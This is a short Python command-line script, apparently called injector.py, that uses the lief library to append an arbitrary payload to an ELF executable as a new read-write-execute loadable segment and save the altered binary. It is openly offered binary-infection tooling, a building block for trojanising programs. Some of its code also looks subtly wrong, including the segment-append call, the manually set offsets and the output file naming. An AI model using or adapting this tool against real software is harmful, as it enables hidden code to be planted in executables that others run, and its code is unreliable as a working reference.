import sys
import lief

def inject_payload(target, payload_path):
    # Read the target ELF file
    target_binary = open(target, 'rb').read()

    # Parse the target ELF file
    elf = lief.parse(target_binary)

    # Read the payload content
    payload_data = open(payload_path, 'rb').read()

    # Convert payload data to a list of integers
    payload_integers = [int(byte) for byte in payload_data]

    # Create a new segment for the payload
    new_segment = lief.ELF.Segment()
    new_segment.type = lief.ELF.SEGMENT_TYPES.LOAD
    new_segment.flags = lief.ELF.SEGMENT_FLAGS.R | lief.ELF.SEGMENT_FLAGS.W | lief.ELF.SEGMENT_FLAGS.X
    new_segment.file_offset = len(target_binary)
    new_segment.virtual_address = elf.segments[-1].virtual_address + elf.segments[-1].virtual_size
    new_segment.physical_address = new_segment.virtual_address
    new_segment.content = payload_integers  # Assign the list of integers

    # Inject the new segment into the ELF file
    elf.segments.append(new_segment)

    # Write the modified ELF data to a new file
    modified_filename = f"modified_{target}"
    elf.write(modified_filename)

    print(f"Injected {payload_path} into {target} with modifications. Modified file saved as {modified_filename}")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print('Usage: python injector.py <target> <payload>')
        sys.exit(1)
        
    target = sys.argv[1]
    payload = sys.argv[2]
    
    inject_payload(target, payload)
